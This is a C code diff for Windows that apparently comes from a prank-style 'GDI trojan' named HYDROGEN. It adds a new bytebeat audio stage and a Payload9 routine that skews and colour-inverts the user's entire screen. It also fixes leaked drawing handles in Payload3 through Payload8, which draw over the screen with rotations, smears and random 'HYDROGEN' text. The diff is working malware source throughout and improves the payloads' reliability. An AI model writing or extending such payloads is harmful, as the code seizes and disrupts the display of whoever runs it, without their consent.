@@ -46,6 +46,9 @@ void AudioPayload() {
 			else if (Time >= PAYLOAD_TIME * 7 && Time < 8 * PAYLOAD_TIME) {
 				wavedata[t] = ((t >> 8 & t >> 4) >> (t >> 16 & t >> 8)) * t;
 			}
+			else if (Time >= PAYLOAD_TIME * 8 && Time < 9 * PAYLOAD_TIME) {
+				wavedata[t] = (t - (t >> 4 & t >> 8) & t >> 12) - 1;
+			}
 		}
 
 		waveOutWrite(hwo, &hdr, sizeof(hdr));
@@ -105,6 +108,10 @@ void Payload3(int t, HDC hdcScreen) {
 		}
 	}
 	BitBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, SRCCOPY);
+
+	DeleteObject(hcdc);
+	DeleteObject(hBitmap);
+
 	Sleep(100);
 }
 void Payload4(int t, HDC hdcScreen) {
@@ -122,6 +129,10 @@ void Payload4(int t, HDC hdcScreen) {
 	blf.AlphaFormat = 0;
 
 	AlphaBlend(hdcScreen, ptScreen.x + t % 200 + 10, ptScreen.y - t % 25, szScreen.cx, szScreen.cy, hcdc, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, blf);
+	
+	DeleteObject(hcdc);
+	DeleteObject(hBitmap);
+	
 	Sleep(20);
 }
 void Payload5(int t, HDC hdcScreen) {
@@ -153,6 +164,9 @@ void Payload6(int t, HDC hdcScreen) {
 
 	RotateDC(hdcScreen, 10, p);
 	AlphaBlend(hdcScreen, 0, t, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);
+
+	DeleteObject(hcdc);
+	DeleteObject(hBitmap);
 }
 void Payload7(int t, HDC hdcScreen) {
 	POINT ptScreen = GetVirtualScreenPos();
@@ -186,6 +200,9 @@ void Payload7(int t, HDC hdcScreen) {
 	TextOut(hdcScreen, random() % szScreen.cx, random() % szScreen.cy, L"HYDROGEN", 8);
 	
 	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);
+
+	DeleteObject(hcdc);
+	DeleteObject(hBitmap);
 }
 void Payload8(int t, HDC hdcScreen) {
 	POINT ptScreen = GetVirtualScreenPos();
@@ -220,6 +237,24 @@ void Payload8(int t, HDC hdcScreen) {
 	}
 
 	AlphaBlend(hdcScreen, 0, 0, szScreen.cx, szScreen.cy, hcdc, 0, 0, szScreen.cx, szScreen.cy, blf);
+
+	DeleteObject(hcdc);
+	DeleteObject(hBitmap);
+
+	Sleep(50);
+}
+void Payload9(int t, HDC hdcScreen) {
+	POINT ptScreen = GetVirtualScreenPos();
+	SIZE szScreen = GetVirtualScreenSize();
+
+	POINT pt[3];
+	pt[0] = { 0,0 };
+	pt[1] = { szScreen.cx,0 };
+	pt[2] = { 25,szScreen.cy };
+	PlgBlt(hdcScreen, pt, hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx + 25, szScreen.cy, NULL, 0, 0);
+
+	SelectObject(hdcScreen, CreateSolidBrush(RGB(random() % 256, random() % 256, random() % 256)));
+	PatBlt(hdcScreen, ptScreen.x, ptScreen.y, szScreen.cx, szScreen.cy, PATINVERT);
 
 	Sleep(50);
 }
